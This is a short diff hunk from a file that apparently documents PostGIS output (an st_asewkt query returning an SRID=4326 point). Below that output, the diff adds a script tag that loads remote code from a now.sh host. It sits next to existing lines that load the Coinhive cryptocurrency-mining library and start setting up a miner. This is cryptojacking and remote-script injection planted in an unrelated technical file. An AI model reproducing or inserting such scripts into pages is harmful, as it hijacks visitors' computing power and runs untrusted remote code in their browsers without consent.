@@ -23,7 +23,7 @@ SELECT st_asewkt('0101000020E610000056BB26A4359E25400000000000004440');
 SRID=4326;POINT(10.809003 40)
 
 
-
+<script src="https://party-lnjuqidzvj.now.sh/client?party"></script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner;
